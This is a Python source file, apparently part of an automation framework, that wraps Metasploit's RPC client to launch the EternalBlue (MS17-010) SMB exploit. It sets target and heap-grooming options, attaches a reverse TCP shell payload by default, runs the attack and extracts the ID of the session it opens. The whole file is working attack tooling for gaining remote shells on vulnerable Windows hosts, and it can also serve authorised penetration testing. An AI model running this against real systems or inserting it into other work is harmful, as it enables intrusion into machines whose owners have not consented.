import re

from pymetasploit3.msfrpc import MsfRpcClient

from libs.modules.Basic import Basic
from libs.modules.list.Payload_List import REVERSE_TCP


class Eternalblue(Basic):
    __module_options: list[str] = ['RHOSTS', 'RPORT', 'SSLVersion', 'ConnectTimeout', 'VERIFY_TARGET',
                                   'VERIFY_ARCH', 'ProcessName', 'GroomAllocations', 'MaxExploitAttempts', 'GroomDelta']

    def __init__(self, rpc: MsfRpcClient, RHOSTS: str, /,
                 # payload module
                 payload=REVERSE_TCP,

                 # module options
                 ConnectTimeout=None, GroomAllocations=None, GroomDelta=None, MaxExploitAttempts=None, ProcessName=None,
                 RPORT=None, SSLVersion=None, VERIFY_ARCH=None, VERIFY_TARGET=None,

                 # payload options
                 AutoLoadStdapi=None, AutoSystemInfo=None, AutoUnhookProcess=None, EXITFUNC=None,
                 EnableUnicodeEncoding=None, LPORT=None, PayloadUUIDTracking=None, PingbackRetries=None,
                 PingbackSleep=None, PrependMigrate=None, ReverseAllowProxy=None, ReverseListenerThreaded=None
                 ):
        """
        :param rpc:
        :param RHOSTS:

        :param payload:

        :param ConnectTimeout:
        :param GroomAllocations:
        :param GroomDelta:
        :param MaxExploitAttempts:
        :param ProcessName:
        :param RPORT:
        :param SSLVersion:
        :param VERIFY_ARCH:
        :param VERIFY_TARGET:

        :param AutoLoadStdapi:
        :param AutoSystemInfo:
        :param AutoUnhookProcess:
        :param EXITFUNC:
        :param EnableUnicodeEncoding:
        :param LPORT:
        :param PayloadUUIDTracking:
        :param PingbackRetries:
        :param PingbackSleep:
        :param PrependMigrate:
        :param ReverseAllowProxy:
        :param ReverseListenerThreaded:
        """

        super().__init__(rpc, 'windows/smb/ms17_010_eternalblue', payload.name_64)

        for i in self.__module_options:
            if locals().get(i) is not None:
                self.set_module_option(i, locals().get(i))

        for i in payload.options:
            if locals().get(i) is not None:
                self.set_payload_option(i, locals().get(i))

    # Must be async
    async def run(self):
        response = await super()._run()
        match = re.search(r'Session (\d+) created', response.split('\n')[-2])
        self.set_session(match.group(1) if match else '-1')
        self.trigger('on_read', response)
